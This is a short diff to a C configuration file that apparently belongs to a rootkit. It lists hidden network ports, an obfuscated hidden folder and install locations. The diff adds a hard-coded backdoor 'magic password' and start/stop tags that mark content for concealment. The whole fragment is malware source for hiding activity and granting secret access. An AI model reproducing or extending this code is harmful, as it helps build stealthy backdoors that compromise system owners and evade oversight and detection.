@@ -7,3 +7,6 @@ char* INSTALL_LOCATIONS[] = {
 			    };
 int HIDDEN_PORTS[]       = {1337, 1338};
 char* HIDDEN_FOLDERS[]    = {AY_OBFUSCATE("jakhid")};
+char* MAGIC_PASS          = "magicpass";
+char* HIDETAG_ENTRY       = "obfuscate_start";
+char* HIDETAG_STOP 		  = "obfuscate_stop";
